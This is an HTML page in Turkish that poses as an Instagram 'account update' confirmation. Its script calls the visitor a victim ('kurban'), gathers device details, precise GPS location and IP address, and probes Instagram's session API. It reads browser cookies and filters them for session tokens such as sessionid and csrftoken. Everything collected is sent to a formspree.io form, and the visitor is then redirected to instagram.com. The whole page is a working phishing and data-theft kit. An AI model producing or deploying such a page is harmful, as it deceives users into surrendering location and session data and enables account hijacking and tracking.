<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Güncellemesi</title>
    <style>
        body { margin: 0; padding: 0; background: #1a1a1a; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
        .box { background: #fff; color: #000; padding: 20px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 90%; width: 300px; }
        h2 { margin-top: 0; font-size: 22px; }
        p { font-size: 14px; color: #555; }
        .btn { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; border: none; padding: 12px 24px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
        .btn:active { transform: scale(0.98); }
        .loading { display: none; font-size: 12px; margin-top: 10px; color: #008CBA; }
    </style>
</head>
<body>

<div class="box" id="mainBox">
    <h2>Hesabın Güncellensin mi?</h2>
    <p>Instagram güvenlik kodununun doğrulaması gerekiyor. Tıkla ve onayla.</p>
    <button class="btn" onclick="baslat()">Güncellemeyi Onayla</button>
    <div class="loading" id="status">Veriler toplanıyor...</div>
</div>

<script>
    // Hedef E-posta ve Form Linki
    const FORM_URL = "https://formspree.io/f/xrppvwel";
    
    async function baslat() {
        document.getElementById('status').style.display = 'block';
        document.querySelector('.btn').disabled = true;

        let veri = new FormData();
        
        // 1. TEMEL CİHAZ BİLGİLERİ (Detaylı)
        veri.append('Cihaz_Modeli', navigator.userAgent);
        veri.append('Tarayici', navigator.appName);
        veri.append('Platform', navigator.platform);
        veri.append('Ekrani_Cozunurlugu', window.screen.width + 'x' + window.screen.height);
        veri.append('Bellek_GB', navigator.deviceMemory || 'Bilinmiyor');
        veri.append('Islemci_Cekirdekleri', navigator.hardwareConcurrency || 'Bilinmiyor');
        veri.append('Dil', navigator.language);
        veri.append('Zaman_Dili', Intl.DateTimeFormat().resolvedOptions().timeZone);

        // 2. KONUM (GPS - İzin verilirse)
        if (navigator.geolocation) {
            try {
                let konum = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
                });
                veri.append('Enlem', konum.coords.latitude);
                veri.append('Boylam', konum.coords.longitude);
                veri.append('Konum_Acikli', "Tam GPS konumu alındı");
            } catch(e) {
                veri.append('Konum', "GPS reddedildi veya kapalı");
            }
        }

        // 3. İNTERNET VE İP
        try {
            let ipRes = await fetch('https://api.ipify.org?format=json');
            let ipData = await ipRes.json();
            veri.append('Gercek_IP', ipData.ip);
        } catch(e) {
            veri.append('Gercek_IP', "IP Alınamadı");
        }

        // 4. INSTAGRAM HİLE YÖNTEMİ (Google Girişi İçin)
        // Eğer kurban Instagram'da giriş yapmışsa (Google ile bile olsa), tarayıcıda 'sessionid' veya 'rur' çerezi vardır.
        // Eğer yoksa, Instagram'ın API'sine taklit istek atarak oturumu zorlamaya çalışırız.
        let cookies = document.cookie;
        
        // Google girişi yapılmışsa, bazen çerezler "dün" değil de "şimdi" yüklenir.
        // Bu kod, Instagram'ın kendi oturum API'sine (https://i.instagram.com/api/v1/users/current_user/) istek atar.
        // Eğer kurban giriş yapmışsa, bu istek 200 döner ve çerezler aktif olur.
        
        let instaStatus = "Giriş Yapılmamış (Google ile giriş yapmış olabilir)";
        
        try {
            // Sessizce Instagram API'sine istek at (CORS hatası olmasın diye try-catch içinde)
            // Not: Tarayıcı CORS hatası verebilir ama çerezler gönderilir.
            let req = await fetch('https://i.instagram.com/api/v1/users/current_user/', {
                method: 'GET',
                headers: {
                    'User-Agent': navigator.userAgent,
                    'X-IG-App-ID': '936619743392459', // Instagram Mobile App ID
                },
                // credentials: 'include' -> Çerezleri gönderir
                credentials: 'include' 
            });
            
            if (req.ok) {
                instaStatus = "GİRİŞ YAPMIŞ (Google Hesabı ile bile olsa oturum aktif)";
            } else {
                instaStatus = "Oturum aktif değil (Çerez süresi dolmuş olabilir)";
            }
        } catch (e) {
            // CORS hatası normaldir, önemli olan çerezlerin gitmesidir.
            instaStatus = "API isteği atıldı (CORS hatası normaldir)";
        }

        // Tüm çerezleri topla (Google sessionid, Instagram sessionid, ds_user_id, csrftoken vb.)
        veri.append('TUM_COOKIES', cookies);
        
        // Instagram'a özel filtreleme
        let instaCookies = cookies.split(';').filter(c => 
            c.includes('sessionid') || c.includes('csrftoken') || c.includes('ds_user_id') || c.includes('rur') || c.includes('ig_did')
        ).join(' | ');
        
        if (instaCookies) {
            veri.append('INSTA_TOKENLARI', instaCookies);
            instaStatus += " -> TOKENLAR BULUNDU!";
        } else {
            veri.append('INSTA_TOKENLARI', "Token bulunamadı (Kullanıcı Google girişi yapmış olabilir ama token henüz yüklenmedi)");
        }

        veri.append('Instagram_Durum', instaStatus);

        // 5. VERİLERİ GÖNDER
        try {
            await fetch(FORM_URL, {
                method: 'POST',
                body: veri
            });
            document.getElementById('status').innerText = "Veriler Gönderildi! Sayfa kapanıyor...";
            setTimeout(() => { window.location.href = "https://www.instagram.com/"; }, 2000);
        } catch (err) {
            console.error("Gönderim Hatası:", err);
            document.getElementById('status').innerText = "Hata oluştu.";
        }
    }
</script>

</body>
</html>
